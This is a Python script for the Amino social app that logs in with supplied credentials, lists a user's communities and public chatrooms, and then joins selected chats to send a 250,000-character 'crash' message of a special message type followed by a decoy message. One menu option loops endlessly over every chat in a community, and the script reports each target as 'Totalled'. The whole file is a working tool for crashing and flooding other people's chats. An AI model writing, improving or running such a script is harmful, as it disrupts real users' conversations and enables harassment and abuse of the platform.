import amino
from time import sleep
import time
import sys
from os import system

def clear(): 
    _ = system('clear')

client = amino.Client()
chatroom = '0'
email=sys.argv[1]
password=sys.argv[2]
comid='0'
chatmenu=[]
chatname={}
commenu={}
Mes="crash"*50000

client.login(email,password)
print('\nLogged in \n')

print('\nAvailable Communities')
comlist= client.sub_clients(size=100)
print('\n')
y=0
for name, id in zip(comlist.name,comlist.comId):
    print(y+1 ," : ",name)
    commenu[y]=str(id)
    y+=1

comid=commenu[int(input("\nchoose the community >> "))-1]
subclient = amino.SubClient(comId=comid, profile=client.profile)

clear()
print("\n")

chats = subclient.get_public_chat_threads(size=100)
decoy=input('Enter decoy message >> ')
while True:
    clear()
    print('\nAvailable Chatrooms')
    x=0
    for name, id in zip (chats.title, chats.chatId):
        if name!=None:
            print(x+1," : ", name)  
            chatname[x]=str(name)
            chatmenu.append(str(id))
            x+=1
    
    print('\nenter 0 if you want to let loose on the whole community')
    print('\nenter 101 if you want to target via Link of the chatroom')
    menu = int(input("\nchoose the chatroom >> "))-1
    

    if menu == 100:
        clear()
        link=input("http://aminoapps.com/p/")
        cobj=client.get_from_code(link).objectId
        subclient.join_chat(cobj)
        subclient.send_message(chatId=cobj,message=Mes,messageType=115)
        subclient.send_message(chatId=cobj,message=decoy,messageType=115)
        tit=subclient.get_chat_thread(cobj).title
        print('\nchat Totalled', tit)
        subclient.leave_chat(cobj)

    
    if menu == -1:
        clear()
        x=0
        while True:
            for i in chatmenu:
                subclient.join_chat(i)
                subclient.send_message(chatId=i,message=Mes,messageType=115)
                subclient.send_message(chatId=i,message=decoy,messageType=115)
                print('\nchat Totalled', chatname[x])
                subclient.leave_chat(i)
                x+=1
    chatroom=chatmenu[menu]
    subclient.join_chat(chatroom)
    clear()
    subclient.send_message(chatId=chatroom,message=Mes,messageType=115)
    subclient.send_message(chatId=chatroom,message=decoy,messageType=115)
    print('\nchat Totalled', chatname[menu])
    subclient.leave_chat(chatroom)
    sleep(2)
    clear()
    




